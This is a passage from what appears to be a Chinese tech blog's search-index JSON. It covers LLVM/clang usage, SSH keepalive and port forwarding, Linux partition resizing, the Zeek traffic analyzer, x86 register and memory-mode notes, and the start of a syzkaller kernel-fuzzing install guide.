install\n部分参数说明：\n\n-DCMAKE_BUILD_TYPE：有Release，Debug和RelWithDebInfo三种选项，分别对应-O3，-O0和-O2三种优化。\n\n-DLLVM_ENABLE_UTILS=ON：将utility binaries如FileCheck和not等安装到CMAKE_INSTALL_PREFIX\n\n-DLLVM_ENABLE_DUMP=ON：允许非Debug编译模式下的LLDB动态调试LLVM时可以调用Value对象的dump方法\n\n-DLLVM_ENABLE_ASSERTIONS=ON：启用ASSERT功能，当clang crash时方便调试排查，但会影响clang性能\n-DCMAKE_INSTALL_PREFIX=$cwd/$INSTALL_DIR：将llvm-project安装到指定目录，否则会安装到默认的/usr/local中。指定此选项之后需要手动将$INSTALL_DIR/bin和$INSTALL_DIR/include添加到环境变量PATH中\n\n自动化多版本管理器llvmmrg2 常用命令clang文件转换图\n\n\n-ccc-print-phrases：打印编译阶段，指定-save-temps参数即可保存以下各阶段的中间文件\n\n$ clang -ccc-print-phases foo.c            +- 0: input, &quot;foo.c&quot;, c         +- 1: preprocessor, &#123;0&#125;, cpp-output      +- 2: compiler, &#123;1&#125;, ir   +- 3: backend, &#123;2&#125;, assembler+- 4: assembler, &#123;3&#125;, object5: linker, &#123;4&#125;, image\n\n-E：执行预处理阶段，clang -E foo.c -o foo.i\n处理所有#开头的预编译指令，包括删除并展开#define对应宏定义，处理#if/#ifdef/#else/#endif，插入#include/#import包含的文件\n删除所有注释//和/**/\n添加行号和文件名标识，如# 1 foo.m\n\n\n-S：进行编译，包括上述阶段以及LLVM生成和优化阶段，编译生成一个汇编文件，clang -S foo.c/foo.i -o foo.s\n词法分析：将源代码的字符分割成token（关键字，标识符，变量，特殊符号等）\n语法分析：生成抽象语法树AST\n静态分析：分析类型声明和匹配问题等\n中间语言生成：根据 AST 自顶向下遍历逐步翻译成 LLVM IR\n目标代码生成与优化：根据中间语言生成依赖具体机器的汇编语言，并优化汇编语言\n\n\n-c：运行前面所有的阶段并生成目标文件，clang -c foo.c -o foo.o\n-###：打印此次编译所执行的命令及选项，但实际不进行编译运行\n-fsyntax-only -Xclang -ast-dump：打印语法树AST\n`-E -Xclang -dump-tokens：解析并打印tokens，可用作词法分析\n\nopt\n--print-passes：打印可用passes\n\n-enable-new-pm=0 --dot-cfg foo.ll：生成dot格式的cfg，是以函数为粒度生成.*.dot文件的\n\n-enable-new-pm=0 --dot-callgraph foo.ll：生成dot格式的cg\n\ndot\ndot -Tpng .main.dot -o main.cfg.png：将dot转为png\n\n3 常用分析PassTo be completed\n4 基于LLVM的静态分析工具crix/ndi/IPPO它们基本都是由The Systems Security Group at University of Minnesota（umnsec）开发的静态分析工具，用于挖掘特定的内核漏洞，代码架构几乎一样：\n\nCrix: Detecting Missing-Check Bugs in OS Kernels\nUsenix Security 2019\nhttps://github.com/umnsec/crix\n\n\nDetecting Missed Security Operations Through Differential Checking of Object-based Similar Paths\n\nCCS 2021\nhttps://github.com/dinghaoliu/IPPO\n\n\nNDI: Non-Distinguishable Inconsistencies as a Deterministic Oracle for Detecting Security Bugs\n\nCCS 2022\nhttps://github.com/umnsec/ndi\n\n\n\n安装时可能遇到以下坑：\n\nzlib\n\n# 需要ZLIB_ROOTexport ZLIB_ROOT=# 并修改CMakeFileList.txt\ndeadline5 参考[1] LLVM官方文档（其中值得看的几个子链接Getting Started with the LLVM System，LLVM Tutorial: Table of Contents，LLVM Programmer’s Manual，Writing an LLVM Pass）\n[2] LLVM Analysis Pass 实验（一）基础操作汇总\n[3] LLVM Analysis Pass 实验（二）控制流（Control Flow）可视化\n[4] zhqli的博客: LLVM教程\n[5] 浅学 Clang（一）：clang 指令介绍\n[6] miniSysY 编译实验 | 北航软院\n","categories":["Static Analysis"],"tags":["LLVM"]},{"title":"SSH保持长连接","url":"/2020/03/27/SSH%E4%BF%9D%E6%8C%81%E9%95%BF%E8%BF%9E%E6%8E%A5/","content":"SSH保持长连接SSH登录服务器而较长时间不进行操作，连接会由服务器自动断开，导致控制台卡死。为了保持SSH的长连接，有以下两种方法：\n\n1 客户端主动保持连接\n编辑/etc/ssh/ssh_config或者~/.ssh/config，追加以下内容\n\nTCPKeepAlive=yes# Client每隔 180 秒发送一次KeepAlive请求给Server，然后Server响应从而保持连接ServerAliveInterval 180# Client发出请求后，服务器端未响应次数达到3，就自动断开连接。正常情况下，Server基本会响应。ServerAliveCountMax 3\n2 服务端主动保持连接\n编辑/etc/ssh/sshd_config，追加以下内容\n\n# Server每隔 180 秒发送一次心跳数据包给Client，然后Client响应从而保持连接ClientAliveInterval 180# Server发出请求后，客户端未响应次数达到10，就自动断开连接。正常情况下，Client基本会响应ClientAliveCountMax 10\n\n重启ssh服务以使配置生效\n\nsystemctl restart sshd\n参考文章[1] SSH 保持连接\n[2] SSH 保持连接 （解决Broken pipe）\n","categories":["Configuration"],"tags":["Linux","ssh"]},{"title":"Linux磁盘分区扩容","url":"/2019/12/12/Linux%E7%A3%81%E7%9B%98%E5%88%86%E5%8C%BA%E6%89%A9%E5%AE%B9/","content":"在主系统以外的系统(无论是虚拟机还是多系统)分配磁盘空间时我们常常比较保守，可能会面临需要扩容根分区的情况。\nLinux磁盘分区扩容（非LVM）1 适用场景在为主系统以外的系统(无论是虚拟机还是多系统)分配磁盘空间时我们常常比较保守，这样可能会遇到根分区空间不足的情况，如图：\n\n但是我们的磁盘上还有空闲的空间未使用。因此我们可以将未使用部分扩展到相邻的分区中。\n\n2 实现2.1 进入rescue mode\n如果扩容的对象是根分区(系统分区)，则首先需要进入rescue mode。如果扩容对象为非系统分区，如/home等，则不需要进入rescue mode。\n一个简单判定是否需要进入rescue mode 或者使用安装镜像U盘启动的方法是，umount此次扩容的对象，操作系统是否会受到影响。\n\n键入命令init 1（单用户模式，仅root）进入到rescue mode\n\n\n\n或者在grub界面选择advanced启动项里的recovery mode\n\n\n最终还是进入到此界面\n\n\n\n2.2 删除待扩容的分区\nfdisk /dev/sda 打开fdisk工具，键入p打印当前/dev/sda磁盘的信息：\n\n\n\n依次键入d，2，删除/dev/sda2分区\n\n\n2.3 新建分区\n依次键入n，p，2，no，来重新创建/dev/sda2。由于之前删除该分区后使得它与此磁盘上未使用的空间合并，因此创建新分区时能够通过指定start和end来扩大新分区的容量。\n注意在被询问是否移除新分区/dev/sda2带有的signature时，选择no，否则该分区原有的数据会丢失。\n\n\n\n\n如果此过程操作无误可以键入w保存并退出。如果有问题可以键入q不保存并退出。\n\n2.4 更新分区表\n此时df -h查看的结果是待扩容分区容量仍然未发生变化，因为还需要调整分区表。\n\ne2fsck -f /dev/sda2检查分区信息\n\n调整分区大小。有两种方法：\n\n一种是卸载待扩容分区，然后运行resize2fs -f /dev/sda2\n\n另一种是不用卸载，在线扩容。不卸载 / 分区直接运行resize2fs -f /dev/sda2会得到如下报错：\n\n\n\n因此需要重新挂载/分区为可读写模式mount -o remount, rw /，然后就可以调整分区大小了。且未使用的空间被格式化为和根分区一致的ext4。\n\n\nreboot之后查看结果。发现之前空闲的6.4G空间已经并入待扩容的根分区。扩容成功\n\n\n\n3 一点补充后期分别在不同的系统上做过尝试，发现有的Linux发行版需要重新挂载/分区来更新分区表大小，比如Kali。而有的发行版比如CentOS，Ubuntu则不需要，进入操作系统后可以直接resize2fs\nLinux磁盘分区扩容（LVM）TODO\n","categories":["Tricks"],"tags":["Linux"]},{"title":"开源网络流量分析框架Zeek","url":"/2020/03/12/Zeek%E7%AE%80%E4%BB%8B/","content":"1 Zeek基本介绍1.1 OverviewZeek又名Bro，是一个被动的开源网络流量分析器。它主要是一种安全监视器，可深入检查链接上的所有流量以查找可疑活动的迹象。在安全领域以外，Zeek还能够进行性能测量，故障检测等工作。\n\n1995年劳伦斯伯克利实验室的研究员Vern开始了Bro的开发，并于1996年在实验室进行内部部署，1998年在USENIX安全研讨会进行发表。2003年，美国国家科学基金会（NSF）开始在国际计算机科学研究所（ICSI）上支持Bro的研究和高级开发。2010年NSF通过向ICSI授予SDCI计划中专门用于Bro开发的赠款，美国国家超级计算应用中心（NCSA）作为该团队的核心合作伙伴加入了该计划。现如今Bro团队现在正在努力通过进一步提高系统功能来应对未来网络的挑战，以此取得成功。\n1.2 Architecture\n由上图可知Zeek的体系结构主要分为两个部分：\n\n事件引擎：Event Engine 将传入的数据包流减少为一系列更高级别的events。这些事件以与策略无关的术语反映了网络活动，它描述已看到的内容，但不对现象进行解释或分析。例如它能将线路上的HTTP request都转化为一个相应的http_request事件，该事件包含了请求的IP，端口和URL以及http version等信息。但是Event Engine不会对此事件进一步解读，如该URL是否对应于已知的恶意站点。\n策略脚本解释器：上例中的事件语义解析将由Zeek的第二个主要组件Policy Script Interpreter派生。该脚本解释器执行一组Zeek自定义脚本语言编写的事件处理程序来对事件进行语义分析。例如一个站点的安全策略将包括监测器检测到不同活动时应该做出的响应等。最重要的是，Zeek允许其脚本随着时间推移而保持工作状态，从而使它们能够跟踪并关联跨连接和主机边界观察到的内容的演变。Bro脚本可以生成实时警报，还可以按需执行任意外部程序，例如触发对攻击的主动响应。\n\n1.3 FeaturesZeek支持很多基于其脚本的分析，并且即便是不采用自定义脚本，它也能具备以下强大的功能特性：\n\nDeployment\n在标准Unix-Style的商用硬件上运行\n能对来自网络分接头或者监测端口的流量进行完全被动的流量分析\n用于捕获数据包的标准libpcap接口\n实时和离线分析\n对于大规模部署支持集群化，且无论是独立还是集群都采用统一的管理框架\nBSD许可下开源\n\n\nAnalysis\n\n全面记录活动，以进行离线分析和取证\n独立与应用层协议的端口分析\n支持许多应用程序层协议（包括DNS，FTP，HTTP，IRC，SMTP，SSH，SSL）\n分析通过应用层协议交换的文件内容，包括用于指纹识别的MD5 / SHA1计算\n全面的IPv6支持\n隧道检测和分析（包括Ayiya，Teredo，GTPv1）。Zeek将隧道解封装，然后继续分析其内容，就像没有隧道一样\n在协议分析过程中进行全面的健全性检查\n支持IDS样式的模式匹配\n\n\nScripting Language\n\n图灵完备的语言，用于表达任意分析任务\n基于事件的编程模型\n特定于域的数据类型，例如IP地址（透明地处理IPv4和IPv6），端口号和计时器\n支持基于时间的跟踪和管理网络状态\n\n\nInterfacing\n\n默认输出到格式良好的ACSII日志\nElasticSearch和DataSeries的备用后端，并将后续支持其它数据接口\n外部输入实时集成到分析中，并将后续支持实时数据库的输入\n外部的C库用于与外部程序交换Zeek的事件，同样支持与Perl，Python和Ruby的绑定\n能够从脚本语言内部触发任意外部进程\n\n\n\n2 Zeek集群架构为什么Zeek需要集群架构？因为Zeek是是单线程的，因此一旦达到单个处理器内核的限制，当前唯一的方法就是把工作负载分散到多个内核甚至是多个物理机上。\n2.1 Cluster Architecture\n上图是Zeek的集群架构示意图\n\nTap是一种机制用来拆分数据流并创建副本用于检测。例如交换机上的监测端口和光纤网络上的分光路器。\nFrontend是一种离散的硬件设备或主机技术，可将流量分为许多流。Zeek的二进制文件并不执行此工作。\nManager是一个Zeek的进程，具有两个主要任务。第一个是从集群的其他采用Zeek通信协议的节点接收日志和通知（如果你用的是logger则会取代manager来接收所有的日志）它的输出结果是一个单独的日志而不是许多需要被后期处理组合的离散的日志。第二个任务是它能够作为通知的阻塞节点来进行重复数据删除操作和通知行为化操作（如将通知以邮件形式发送，分页或者阻止）。\nLogger是一个可选的Zeek进程，它使用Zeek通信协议从群集的其余节点接收日志消息。让logger代替manager接收日志的目的是为了减轻manager的负担。\nProxy是一个用于同步状态的Zeek进程，变量能够自动地在连接的Zeek进程间同步。proxy避免了所有worker都相互直连。\nWorker是嗅探网络流量并对重新组合的流量进行协议分析的Zeek进程。由于一个集群的所有协议解析和大多数分析都将在此处进行，因此建议采用尽可能高性能的内存和CPU。因为几乎所有日志记录都是在远程对manager完成的，并且通常很少写入磁盘，因此workers对磁盘没有特殊要求。\n\n2.2 Frontend Options2.2.1 分立的硬件流量平衡器\ncPacket：如果要监视一个或多个10G物理接口，建议的解决方案是使用cPacket的cFlow或cVu设备，这些设备将通过重写目标以太网MAC地址以使与特定流关联的每个数据包具有相同的目标MAC，来执行第2层负载平衡。然后可以将数据包直接传递到监视主机，在监视主机上，每个worker都有一个BPF Filter以将其可见性限制为仅该流，或者继续传递到商用交换机，以将流量拆分为多个以适配worker的1G接口。从而大大降低成本。\nOpenFlow Switches：基于OpenFlow的交换机直接在交换机上进行基于流的负载平衡，从而大大降低了许多用户的前端成本。官方正在探索中…\n\n2.2.2 主机流量平衡机制\nPF_RING： Linux的PF_RING软件具有“群集”功能，该功能将在嗅探同一接口的多个进程之间进行基于流的负载平衡。这使您可以轻松地在单个物理主机中利用多个内核，因为Bro的主事件循环是单线程的，因此无法本机利用所有内核。如果要使用PF_RING，请参阅有关如何使用PF_RING配置Zeek的文档。\nNetmap： FreeBSD有一个正在进行的名为Netmap的项目，该项目还将启用基于流的负载平衡。官方正在探索中…\nSoftware Router： 可以通过简单的配置用于基于流的负载平衡。由于Zeek的PF_RING支持，因此不建议在Linux上使用此解决方案，并且仅将其作为其他操作系统上的不得已的方法，因为该解决方案会因每个数据包在内核和用户域之间来回上下文切换数次而导致大量开销。\n\n","categories":["Tutorial"],"tags":["IDS","Zeek"]},{"title":"Zeek脚本语言(一)","url":"/2020/03/16/Zeek%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80-%E4%B8%80/","content":"本文将主要介绍和讲解Zeek脚本语言的数据类型，基于语法和属性\n\n数据类型基础数据类型Zeek有以下内建数据类型\n\n\n\n\n名称\n描述\n\n\n\n\nbool\n布尔型\n\n\ncount， int， double\n数值类型\n\n\ntime， interval\n时间类型\n\n\nstring\n字符串\n\n\npattern\n正则表达式\n\n\nport， addr， subnet\n网络类型\n\n\nenum\n枚举（用户定义类型）\n\n\ntable， set， vector， record\n容器类型\n\n\nfunction， event， hook\n可执行类型\n\n\nfile\n文件类型（仅用于写入）\n\n\nopaque\n不透明类型（用于某些内建功能）\n\n\nany\n任何类型（用于函数或容器）\n\n\n\n\n以下是每一种数据类型的详细说明\n\nbool：拥有T和F两种取值。支持比较运算（==，!=），逻辑运算和绝对值运算（|T|=1，|F|=0，类型为count）\nint：64位有符号整型。支持算术，比较，逻辑，赋值和绝对值运算（运算结果类型为count）\ncount：64位无符号整型。支持的运算符和int相同，其中一元加减运算的结果的类型为int\ndouble：双精度浮点型。支持的运算符与int相同\ntime：表示绝对时间的时间类型。time类型仅能通过double_to_time, current_time, network_time内建函数来赋值。time类型支持比较运算符。time类型相减能够产生interval类型数据，time类型的绝对值是double类型\ninterval：表示相对时间的时间类型。其格式为数字常数+时间单位，时间单位有usec, msec, sec, min, hr和day。以下几种均为正确的表达形式：3.5 min, 3.5min, 3.5mins, -12 hr\nstring：字符串类型。由双引号包括，脚本中不支持多行字符串\n支持+拼接，=和+=来赋值。支持pp比较运算符。取绝对值运算可以计算出字符串的长度。支持in和!in来判断字符串包含关系\n支持\\转义如：\\\\, \\n, \\t, \\v, \\b, \\r, \\f, \\a, \\onn(n为8进制数码), \\xhh(h为16进制数码)。当Zeek无法识别转义字符串时将会忽略\\，如\\g将会变成g\n支持下标法访问字符串中的字符。但是不可以对下表法表示的字符串进行赋值修改，即它们是只读的\n\n\npattern：正则表达式类型。pattern常量是通过两个正斜杠/来创建的，并采用与flex词法分析器语法\n\nport：表示传输层端口的数据类型。port常量由一个无符号整数和端口类型（\\tcp, \\udp, \\icmp or \\unknow）组成\n\nport类型支持比较运算符，且比较顺序为 unknown &lt; tcp &lt; udp &lt; icmp，比如65535/tcp &lt; 0/udp \nget_port_transport_proto和port_to_count是Zeek内建的函数，分别能够从port型数据提取传输协议（后面的协议字符串）和端口号（前面的count型端口号）\n\n\naddr：表示IP地址的类型。支持ipv4和ipv6，且支持其常规的表示方式\n支持比较运算符，比较大小时当作正常数值进行比较。如192.168.99.254 &lt; 192.168.100.0\n可以通过/来产生subnet型数据。并可以用in来判断一个addr是否属于subnet\n一个域名数据可能对应多个IP地址，因此常用set[addr]来表示\n\n\nsubnet：表示子网的类型。由addr和/network_prefix_size组成。如192.168.100.0/24和 [fe80::]/64。subnet类型仅支持==和!= 比较运算符\nenum：枚举类型。且枚举类型的value不具备深层次的结构。仅支持==, != 和=运算符\n\n高级数据类型Zeek还有以下内建数据类型\n\n\n\n\n名称\n描述\n\n\n\n\ntable， set， vector， record\n容器类型\n\n\nfunction， event， hook\n可执行类型\n\n\nfile\n文件类型（仅用于写入）\n\n\nopaque\n不透明类型（用于某些内建功能）\n\n\nany\n任何类型（用于函数或容器）\n\n\n\n\n\ntable：表示映射关系的表类型。被映射的值称为index或者indices，映射的结果称为yield。是一种非常高效的索引类型，其内部实质为一个单哈希查找表\nset：\n\n基本语法定义变量定义函数运算符条件语句循环语句属性","categories":["Tutorial"],"tags":["IDS","Zeek"]},{"title":"x86汇编学习笔记(一)","url":"/2019/09/30/x86%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%B8%80/","content":"本文主要介绍了80x86的寄存器，80x86处理器的工作模式，Windows的内存管理和寻址方式。\n\n1 80386的寄存器1.1 通用寄存器\nEAX: 通用寄存器。相对其他寄存器，在进行运算方面比较常用。在保护模式中，也可以作为内存偏移指针（此时，DS作为段寄存器或选择器）\nEBX: 通用寄存器。通常作为内存偏移指针使用（相对于EAX、ECX、EDX）。在保护模式中，同样可以起这个作用。\nECX: 通用寄存器。通常用于特定指令的计数。在保护模式中，也可以作为内存偏移指针（此时，DS作为寄存器或段选择器）。\nEDX: 通用寄存器。在某些运算中作为EAX的溢出寄存器（例如乘、除）。在保护模式中，也可以作为内存偏移指针（此时，DS作为段 寄存器或选择器）。\n\n注：以上四个寄存器均为32位，且具有16-bit和8-bit的分组。即我们可以通过AX来访问EAX的低16位，通过AH和AL来访问AX的高8位和低8位。\n\nESI: 通常在内存操作指令中作为“源地址指针”使用。当然，ESI可以被装入任意的数值，但通常没有人把它当作通用寄存器来用。\nEDI: 通常在内存操作指令中作为“目的地址指针”使用。当然，EDI也可以被装入任意的数值，但通常没有人把它当作通用寄存器来用。\nEBP: 一个指针的寄存器。通常，它被高级语言编译器用以建造‘堆栈帧’来保存函数或过程的局部变量，不过，还是那句话，你可以在其中保存你希望的任何数据。SS是它的默认段寄存器或选择器。\n\n注：以上三个寄存器也是32位寄存器，但是没有8-bit分组。\n1.2 段寄存器和选择器\nCS: 代码段，或代码选择器。同IP寄存器一同指向当前正在执行的那个地址。处理器执行时从这个寄存器指向的段（实模式）或内存（保护模式）中获取指令。除了跳转或其他分支指令之外，你无法修改这个寄存器的内容。\nDS: 数据段，或数据选择器。这个寄存器的低16 bit连同ESI一同指向的指令将要处理的内存。同时，所有的内存操作指令 默认情况下都用它指定操作段(实模式)或内存(作为选择器，在保护模式)。\nES: 附加段，或附加选择器。这个寄存器的低16 bit连同EDI一同指向的指令将要处理的内存。同样的，这个寄存器可以被装入任意数值，方法和DS类似。\nFS: F段或F选择器(推测F可能是Free?)。可以用这个寄存器作为默认段寄存器或选择器的一个替代品。它可以被装入任何数值，方法和DS类似。\nGS: G段或G选择器(G的意义和F一样，没有在Intel的文档中解释)。它和FS几乎完全一样。\nSS: 堆栈段或堆栈选择器。这个寄存器的低16 bit连同ESP一同指向下一次堆栈操作(push和pop)所要使用的堆栈地址。这个寄存器也可以被装入任意数值，你可以通过入栈和出栈操作来给他赋值，不过由于堆栈对于很多操作有很重要的意义，因此，不正确的修改有可能造成对堆栈的破坏。\n\n注：段寄存器和选择器在没有制定的情况下都是使用默认对应的寄存器。\n1.3 特殊寄存器\nEIP: 一个32位宽的寄存器 ，同CS一同指向即将执行的那条指令的地址。不能够直接修改这个寄存器的值，修改它的唯一方法是跳转或分支指令。(CS是默认的段或选择器)\nESP: 这个32位寄存器指向堆栈中即将被操作的那个地址。尽管可以修改它的值，然而并不提倡这样做，因为如果你不是非常明白自己在做什么，那么你可能造成堆栈的破坏。对于绝大多数情况而言，这对程序是致命的。(SS是默认的段或选择器)\n\n1.4 其他寄存器以下寄存器均为32位\n\nCR0, CR2, CR3: 控制寄存器。其中CR0的作用是切换实模式和保护模式\nD0, D1, D2, D3, D6, D7: 调试寄存器。可以作为调试器的硬件支持来设置条件断点\nTR3, TR4, TR5, TR6: 测试寄存器。用于某些条件测试\n\n2 80x86的工作模式80386处理器由三个工作模式：实模式，保护模式和虚拟86模式。实模式和虚拟86模式都是为了和8086处理器兼容而设置的。\n2.1 实模式\n80386处理器被复位或加电的时候以实模式启动。这时候处理器中的各寄存器以实模式的初始化值工作。\n80386处理器在实模式下的存储器寻址方式和8086是一样的：由段寄存器的内容乘以16当作基地址，加上段内的偏移地址形成最终的物理地址。（32位地址线只用了20位，即1MB）。\n实模式下80386处理器不能对内存进行分页管理，所以指令寻址的地址就是内存的实际地址。\n实模式下，所有的段都是可读写和执行的。\n实模式下的80386不支持优先级，所有的指令相当于工作在特权级（优先级0），所以它可以执行所有的特权指令。实际上，80386就是通过在实模式下初始化控制寄存器，GDTR，LDTR, IDTR与TR等管理寄存器以及页表，然后再通过加载CR0使其中的保护模式使能位置位而进入保护模式的。\n实模式下中断处理方式和80386处理器相同。也是用中断向量表来定位中断服务程序地址。中断向量表的结构也和8086处理器一样：每4个字节组成一个中断向量，其中包括两个字节的段地址和2个字节的偏移地址。\n\n2.2 保护模式\n当80386处理器工作在保护模式时，其所有功能都是可用的。\n80386所有的32根地址线都可提供寻址，物理寻址空间达4GB\n保护模式下，支持内存分页机制，提供了对虚拟内存的良好支持。\n保护模式下，支持多任务。仅依靠硬件即可再一条指令中实现任务切换。任务环境的保护工作是由处理器自动完成的。\n保护模式下，80386处理器还支持优先级机制。优先级分为4个（0级到3级），操作系统运行在最高优先级0级上。应用程序则运行在较低优先级上。配合良好的检查机制后，即可实现多任务的数据安全共享，也能够很好地隔离各个任务。\n实模式切换到保护模式是通过修改控制寄存器CR0的控制位PE(位0)实现的。在此之前，需要建立保护模式必须的数据表，如全局描述表GDT和中断描述表IDT等。\nDOS操作系统运行于实模式下，而Windows操作系统运行于保护模式下。\n\n2.3 虚拟86模式\n虚拟86模式是为了在保护模式下执行8086程序而设置的。（实模式的兼容做得并不足够）\n虚拟86模式是以任务形式在保护模式上执行的。在80386上可以同时支持由多个真正的80386任务和虚拟86模式构成的任务。\n虚拟86模式支持任务切换机制。在Windows操作系统中，有一部分程序专门用来管理虚拟86模式的任务，成为虚拟86管理程序\n虚拟86模式采用和8086一样的寻址方式：即用段寄存器乘以16当作基址在加上偏移地址。寻址空间为1MB。\n虚拟86模式支持内存分页机制，因此能够很好地解决不同虚拟86任务的地址空间问题，通过分页机制的地址映射，让每个任务都认为自己在使用0~1MB的地址空间。\n8086有部分指令在保护模式下属于特权指令，如屏蔽中断的cli和中断返回指令iret等。为了让8086的代码能够正常执行，虚拟86管理程序采用模拟的方式来完成这些指令：这些指令首先会引起保护异常，虚拟86程序则在异常处理程序中检查这些指令，并做出合理的响应。MS-DOS应用程序在Windows操作系统就是这样工作的。\n\n3 Windwos的内存管理3.1 DOS操作系统的内存安排\n\nDOS运行于实模式，存储器的地址被安排在高端，从A0000h（即640KB）开始的384KB中。\n而在内存低端，则安排了中断向量表和BIOS数据区。\n剩余的从500h到A0000h总共不到640KB的内存是操作系统和应用程序所能使用的。(著名的640KB限制)\n当80386处理器（32位）推出后，可寻址空间达到了4GB，利用XMS驱动程序可以访问到所有的地址空间。但是16位的段寻址方式限制了DOS程序，“可见”的内存范围还是停留在前1MB范围内。所有高于1MB的扩展内存只能通过XMS驱动程序当作数据交换使用，程序执行的空间并无增加。\n\nDOS的寻址方式：\n\n一个完整的地址分为段地址和偏移地址两部分组成：\n段地址xxxx存放在16位的段寄存器中\n16位的偏移地址yyyy存放在指令中\n\n\n计算方法：real = xxxx * 0x10 + yyyy\n\n3.2 80386的内存寻址机制实模式下的内存寻址方式：\n\n保护模式下GDTR、LDTR、全局描述表、局部描述表和选择器的关系：\n\n3.3 80386的分页机制80386的内存地址转换：\n\n虚拟内存的实现：\n\n3.4 Windows的内存安排\n4 参考[1]《Windows PE 权威指南》\n","categories":["Notes"],"tags":["x86 Assembly"]},{"title":"SSH端口转发用法解析","url":"/2021/02/18/SSH%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E7%94%A8%E6%B3%95%E8%A7%A3%E6%9E%90/","content":"SSH端口转发是一个很实用的运维技巧，我结合了man page解析了SSH端口转发的本地转发(-L)，远程转发(-R)，动态转发(-D)和常用相关参数的用法。\n\n名词设置为了方便表述，我定义了一些名词（可能并不规范）\n\n客户端与服务端：\n\nssh客户端：发起ssh连接请求的所在端，指ssh-client，也可以指其所在的主机\nssh服务端：ssh连接请求的对象所在端，指ssh-server，也可以指其所在的主机\n端口客户端：向某端口发起服务请求的应用或主机\n端口服务端：想某端口提供服务响应的应用或主机\n\n\n机器：\n\n本地主机（local）：指ssh客户端所在的主机，记作A\n远端主机（remote）：指ssh服务端所在的主机，记作B\nHost主机（host）：指要转发的端口服务端所在的主机，记作C\n\n\n\n本地转发man page：\n-L [bind_address:]port:host:hostport-L [bind_address:]port:remote_socket-L local_socket:host:hostport-L local_socket:remote_socket        Specifies that connections to the given TCP port or Unix socket on the local (client) host are to be forwarded to the given host and port, or Unix socket, on the remote side.  This works by allocating a socket to listen to either a TCP port on the local side, optionally bound to the specified bind_address, or to a Unix socket.  Whenever a connection is made to the local port or socket, the connection is forwarded over the secure channel, and a connection is made to either host port hostport, or the Unix socket remote_socket, from the remote machine.        Port forwardings can also be specified in the configuration file.  Only the superuser can forward privileged ports.  IPv6 addresses can be specified by enclosing the address in square brackets.        By default, the local port is bound in accordance with the GatewayPorts setting.  However, an explicit bind_address may be used to bind the connection to a specific address.  The bind_address of “localhost” indicates that the listening port be bound for local use only, while an empty address or ‘*’ indicates that the port should be available from all interfaces.\n远程转发man page：\n-R [bind_address:]port:host:hostport-R [bind_address:]port:local_socket-R remote_socket:host:hostport-R remote_socket:local_socket-R [bind_address:]port        Specifies that connections to the given TCP port or Unix socket on the remote (server) host are to be forwarded to the local side.        This works by allocating a socket to listen to either a TCP port or to a Unix socket on the remote side.  Whenever a connection is made to this port or Unix socket, the connection is for‐warded over the secure channel, and a connection is made from the local machine to either an explicit destination specified by host port hostport, or local_socket, or, if no explicit destination was specified, ssh will act as a SOCKS 4/5 proxy and forward connections to the destinations requested by the remote SOCKS client.        Port forwardings can also be specified in the configuration file.  Privileged ports can be forwarded only when logging in as root on the remote machine.  IPv6 addresses can be specified by enclosing the address in square brackets.        By default, TCP listening sockets on the server will be bound to the loopback interface only.  This may be overridden by specifying a bind_address.  An empty bind_address, or the address ‘*’, indicates that the remote socket should listen on all interfaces.  Specifying a remote bind_address will only succeed if the server&#x27;s GatewayPorts option is enabled (see sshd_config(5)).        If the port argument is ‘0’, the listen port will be dynamically allocated on the server and reported to the client at run time.  When used together with -O forward the allocated port will be printed to the standard output.\n动态转发man page：\n-D [bind_address:]port        Specifies a local “dynamic” application-level port forwarding.  This works by allocating a socket to listen to port on the local side, optionally bound to the specified bind_address.  Whenever a connection is made to this port, the connection is forwarded over the secure channel, and the application protocol is then used to determine where to connect to from the remote machine. Currently the SOCKS4 and SOCKS5 protocols are supported, and ssh will act as a SOCKS server.  Only root can forward privileged ports.  Dynamic port forwardings can also be specified in the configuration file.        IPv6 addresses can be specified by enclosing the address in square brackets.  Only the superuser can forward privileged ports.  By default, the local port is bound in accordance with the GatewayPorts setting. However, an explicit bind_address may be used to bind the connection to a specific address.  The bind_address of “localhost” indicates that the listening port be bound for local use only, while an empty address or ‘*’ indicates that the port should be available from all interfaces.\n相关参数","categories":["Tricks"],"tags":["Linux","ssh"]},{"title":"syzkaller安装与使用","url":"/2022/10/31/syzkaller%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/","content":"本文记录了我的syzkaller安装和使用的踩坑记录。\nsyzkaller是2015年Google提出的一款主要用Go编写的基于覆盖率的内核fuzzer。2017年它的持续性fuzzing平台syzbot部署上线，迄今为止已经挖掘并报告了超过4000个内核漏洞。\n\n强烈不建议在虚拟机中安装syzkaller并进行内核fuzz，有条件尽量在配置较好的服务器上进行（亲测orz\n\n配置代理的一个大坑，保证http_proxy等代理对sudo生效（不论当前用户是否为root，都需要加以下内容）\n#/etc/sudoersDefaults env_keep += &quot;http_proxy https_proxy ftp_proxy&quot;  \n1 安装依赖\n安装基本软件依赖\n\nsudo apt updatesudo apt install -y debootstrap qemu qemu-kvmsudo apt install -y git make build-essential openssh-serversudo apt install -y libssl-dev libelf-devsudo apt install -y flex bison libc6-dev libc6-dev-i386 linux-libc-dev libgmp3-dev libmpfr-dev libmpc-devsudo apt install -y bc # 在一次纯净docker测试中发现编译内核时缺少这个包\n\n安装Go（建议1.19）\n\ncd ~wget https://go.dev/dl/go1.19.7.linux-amd64.tar.gztar -zxvf go1.19.7.linux-amd64.tar.gz export GOPATH=~/goexport GOROOT=~/goexport PATH=$GOPATH/bin:$PATH# 测试是否安装成功，顺便检查一下go envgo env\n2 安装syzkaller\n源码编译安装syzkaller\n\ngit clone https://github.com/google/syzkaller.gitcd syzkaller# 这一步对内存有要求。在虚拟机中分配4G以上内存+4G swap可以成功编译。make# make无报错且在syzkaller/bin目录下看到相关二进制即安装成功\n3 编译内核\n下载内核源码\n\n在 https://mirrors.edge.kernel.org/pub/linux/kernel/ 选择想要测试的内核版本（拉最新的吧）\nwget https://cdn.kernel.org/pub/linux/kernel/v6.x/linux-6.1.12.tar.xztar xvJf linux-6.1.12.tar.xz\n\n编译内核\n\n# 生成编译配置cd linux-6.1.12make CC=&quot;/usr/bin/gcc&quot; defconfigmake CC=&quot;/usr/bin/gcc&quot; kvm_guest.config# 